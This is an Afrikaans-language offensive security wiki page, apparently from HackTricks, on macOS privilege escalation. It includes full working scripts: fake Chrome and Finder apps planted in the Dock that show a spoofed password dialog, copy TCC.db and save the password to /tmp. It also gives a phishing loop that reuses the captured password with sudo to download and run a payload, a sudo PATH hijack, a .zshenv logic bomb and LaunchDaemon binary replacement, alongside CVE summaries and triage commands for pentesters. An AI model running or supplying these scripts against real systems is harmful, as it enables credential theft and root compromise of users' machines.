# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

As jy hierheen gekom het op soek na TCC privilege escalation, gaan na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Baie privilege-escalation-tegnieke wat Linux of ander Unix-agtige stelsels raak, is ook op macOS van toepassing. Sien:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## User Interaction

### Sudo Hijacking

Jy kan die oorspronklike [Sudo Hijacking-tegniek binne die Linux Privilege Escalation-plasing](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking) vind.

macOS **behou** egter die gebruiker se **`PATH`** wanneer hy **`sudo`** uitvoer. Dit beteken dat ’n ander manier om hierdie aanval uit te voer, sou wees om **ander binaries te kaap** wat die slagoffer steeds sal uitvoer wanneer hy **sudo uitvoer:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Let daarop dat 'n gebruiker wat die terminal gebruik, heel waarskynlik **Homebrew geïnstalleer sal hê**. Dit is dus moontlik om binaries in **`/opt/homebrew/bin`** te kaap.

### Dock-nabootsing

Deur gebruik te maak van **social engineering**, kan jy byvoorbeeld **Google Chrome** binne die Dock **naboots** en eintlik jou eie script uitvoer:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Enkele voorstelle:

- Kyk in die Dock of daar 'n Chrome is, en indien wel, **verwyder** daardie item en **voeg** die **vals** **Chrome-item op dieselfde posisie** in die Dock-skikking **by**.

<details>
<summary>Chrome Dock-nabootsingsscript</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Enkele voorstelle:

- Jy **kan Finder nie uit die Dock verwyder nie**, dus, as jy dit by die Dock gaan voeg, kan jy die vals Finder net langs die regte een plaas. Hiervoor moet jy **die vals Finder-inskrywing aan die begin van die Dock-skikking voeg**.
- Nog ’n opsie is om dit nie in die Dock te plaas nie en dit net oop te maak; “Finder asking to control Finder” is nie so vreemd nie.
- Nog ’n opsie om **sonder om die wagwoord te vra na root te eskaleer** met ’n aaklige venster, is om Finder werklik vir die wagwoord te laat vra om ’n bevoorregte aksie uit te voer:
- Vra Finder om ’n nuwe **`sudo`-lêer** na **`/etc/pam.d`** te kopieer. (Die versoek om die wagwoord sal aandui dat “Finder sudo wil kopieer”.)
- Vra Finder om ’n nuwe **Authorization Plugin** te kopieer. (Jy kan die lêernaam beheer sodat die versoek om die wagwoord sal aandui dat “Finder Finder.bundle wil kopieer”.)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware misbruik dikwels gebruikersinteraksie om ’n **sudo-capable password** vas te lê en dit programmaties te hergebruik. ’n Algemene vloei:

1. Identifiseer die aangemelde gebruiker met `whoami`.
2. **Herhaal password prompts** totdat `dscl . -authonly "$user" "$pw"` suksesvol terugkeer.
3. Kas die credential (bv. `/tmp/.pass`) en voer privileged actions uit met `sudo -S` (password oor stdin).

Voorbeeld van ’n minimale ketting:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Die gesteelde wagwoord kan dan hergebruik word om **Gatekeeper quarantine met `xattr -c` skoon te maak**, LaunchDaemons of ander bevoorregte lêers te kopieer, en bykomende stages nie-interaktief uit te voer.<sup>[[1]](#references)</sup>

## Nuwer macOS-spesifieke vectors (2023–2026)

### Verouderde `AuthorizationExecuteWithPrivileges` steeds bruikbaar

`AuthorizationExecuteWithPrivileges` is in 10.7 deprecated, maar **werk steeds op Sonoma/Sequoia**. Baie kommersiële updaters roep `/usr/libexec/security_authtrampoline` met ’n onbetroubare pad aan. As die teiken-binêr deur die gebruiker geskryf kan word, kan jy ’n trojan plaas en die wettige prompt benut:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombineer met die **masquerading tricks hierbo** om ’n geloofwaardige wagwoorddialoog aan te bied.


### Bevoorregte helper / XPC-triage

Baie moderne derdeparty-macOS-privescs volg dieselfde patroon: ’n **root LaunchDaemon** stel ’n **Mach/XPC-service** vanuit **`/Library/PrivilegedHelperTools`** bloot, waarna die helper óf **nie die client valideer nie**, dit **te laat valideer** (PID-race), óf ’n **root-metode** blootstel wat ’n **user-controlled path/script** gebruik. Dit is die bug-klas agter baie onlangse helper-bugs in VPN-clients, game launchers en updaters.<sup>[[2]](#references)</sup>

Vinnige triage-kontrolelys:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Gee spesiale aandag aan helpers wat:

- aanhou om versoeke te aanvaar **ná uninstall** omdat die job in `launchd` gelaai gebly het
- scripts uitvoer of konfigurasie vanaf **`/Applications/...`** of ander paaie lees wat deur nie-root-gebruikers geskryf kan word
- staatmaak op **PID-based** of **bundle-id-only** peer validation wat moontlik raceable is

Vir meer besonderhede oor helper authorization bugs, kyk na [hierdie bladsy](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Totdat Apple dit in **Sonoma 14.5**, **Ventura 13.6.7** en **Monterey 12.7.5** reggestel het, kon gebruiker-geïnisieerde installasies via **`Installer.app`** / **`PackageKit.framework`** **PKG scripts as root binne die huidige gebruiker se environment** uitvoer. Dit beteken dat ’n package wat **`#!/bin/zsh`** gebruik, die aanvaller se **`~/.zshenv`** sou laai en dit as **root** uitvoer wanneer die slagoffer die package geïnstalleer het.<sup>[[3]](#references)</sup>

Dit is veral interessant as ’n **logic bomb**: jy benodig slegs ’n foothold in die gebruiker se account en ’n writable shell startup file; daarna wag jy totdat enige kwesbare **zsh-based** installer deur die gebruiker uitgevoer word. Dit is oor die algemeen nie van toepassing op **MDM/Munki**-deployments nie, omdat dié binne die root-gebruiker se environment loop.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
As jy ’n dieper ondersoek na installer-spesifieke misbruik wil doen, kyk ook na [hierdie bladsy](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Installer-bestemmingsbotsing via `.localized`

Sommige derdeparty-installers registreer ’n root LaunchDaemon waarvan die uitvoerbare lêer met ’n vaste pad binne `/Applications/Target.app` verwys word. As ’n aanvaller daardie bundle eerste met ’n **ander bundle identifier** kan skep, kan Installer die lokasie behou en die werklike toepassing by `/Applications/Target.localized/Target.app` plaas. Die daemon wys steeds na die oorspronklike pad. Daarom kan ’n uitvoerbare lêer wat deur die aanvaller beheer word binne die lokasie later as root loop.<sup>[[8]](#references)</sup>

Die belangrikste voorwaardes is:<sup>[[8]](#references)</sup>

1. Die aanvaller kan die verwagte toepassingspad skep of beheer.
2. Die package verwyder nie die botsende bundle nie.
3. Die bevoorregte job gebruik ’n hardgekodeerde pad binne daardie bundle.
4. Die gebruiker of ’n MDM-workflow installeer die package en registreer die job.

Soek na hervestigde bundles en hersien daarna LaunchDaemon-teikens met die enumerasie-lus in die volgende afdeling:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
'n Veiliger installeerder bepaal die finale bundle-ligging en hou bevoorregte uitvoerbare lêers in 'n root-owned-ligging soos `/Library/PrivilegedHelperTools`. Dit behoort ook eienaarskap en code signing te verifieer voordat die job geregistreer of begin word.<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

'n LaunchDaemon-plist kan root-owned wees terwyl sy `Program`- of eerste `ProgramArguments`-inskrywing na 'n user-writable-gids wys. Kontroleer die **hele pad**, nie net die uitvoerbare lêer se modus nie. As die ouergids writable is, kan 'n attacker 'n root-owned-uitvoerbare lêer hernoem en 'n replacement by dieselfde pad skep. Die replacement loop as root die volgende keer wanneer die job begin. 'n Reboot of 'n normale service restart is voldoende. Die attacker het nie toestemming nodig om `launchctl bootstrap` in die system domain uit te voer nie.<sup>[[7]](#references)</sup>

Enumereer eers elke target en sy onmiddellike ouer:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Wanneer die lêer of sy ouer skryfbaar is, behou die oorspronklike binary en vervang die pad met ’n uitvoerbare payload. Wag dan totdat die reeds-gelaaide daemon herbegin.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

Die kwesbare `kauth_cred_proc_update`-pad het `proc_ro.p_ucred` opgedateer met die nie-atomiese `zalloc_ro_mut` API, terwyl SMR-lesers die pointer sonder ’n lock gelaai het. Die publieke trigger gebruik ’n spesiaal voorbereide setgid-binêre lêer. Een thread wissel tussen sy werklike en effektiewe groep-ID’s, terwyl ’n ander thread herhaaldelik ’n syscall soos `getgid()` uitvoer.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Behandel dit as 'n **race primitive**, nie as 'n klaargemaakte root exploit nie. Die gepubliseerde PoC demonstreer 'n geskeurde credential pointer. Dit eindig gewoonlik in 'n kernel panic. Die navorser het die korrupsie slegs op Intel gereproduseer en nie deterministiese beheer oor die gevolglike credential object verskaf nie. Apple het die opdatering in macOS 15.3 na 'n atomic pointer exchange verander.<sup>[[4]](#references)</sup>

### SIP bypass via Migration Assistant ("Migraine", CVE-2023-32369)

As jy reeds root het, blokkeer SIP steeds skryfaksies na stelselliggings. Die **Migraine** bug misbruik die Migration Assistant entitlement `com.apple.rootless.install.heritable` om 'n child process te spawn wat SIP bypass erf en beskermde paaie (bv. `/System/Library/LaunchDaemons`) oorskryf.<sup>[[5]](#references)</sup> Die ketting:

1. Verkry root op 'n aktiewe stelsel.
2. Trigger `systemmigrationd` met vervaardigde state om 'n aanvaller-beheerde binary uit te voer.
3. Gebruik die geërfde entitlement om SIP-beskermde lêers te patch, wat selfs ná 'n reboot voortduur.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Veelvuldige Apple daemons aanvaar **NSPredicate**-objects oor XPC en valideer slegs die `expressionType`-veld, wat deur die aanvaller beheer word. Deur 'n predicate te vervaardig wat arbitrêre selectors evalueer, kan jy **code execution in root/system XPC services** (bv. `coreduetd`, `contextstored`) verkry. Wanneer dit met 'n aanvanklike app sandbox escape gekombineer word, verleen dit **privilege escalation without user prompts**. Soek XPC endpoints wat predicates deserialize en nie 'n robuuste visitor het nie.<sup>[[6]](#references)</sup>

## TCC - Root-voorreg-eskalering

### CVE-2020-9771 - mount_apfs TCC-bypass en voorreg-eskalering

**Enige gebruiker** (selfs onbevoorregte gebruikers) kan 'n Time Machine snapshot met `-o noowners` skep en mount, en **toegang tot AL die lêers** van daardie snapshot verkry, wat die ownership checks op die live volume omseil. Die enigste voorreg wat nodig is, is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) moet hê.

Die commands en die volledige verduideliking is op die TCC-bypasses-bladsy:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitiewe inligting

Dit kan nuttig wees om voorregte te eskaleer:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN vir macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP-bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - 'n Nuwe voorreg-eskalerings-bug class op macOS en iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking: voorreg-eskalering en persistence via onveilige vouer-permissies](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE via die .localized-gids](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
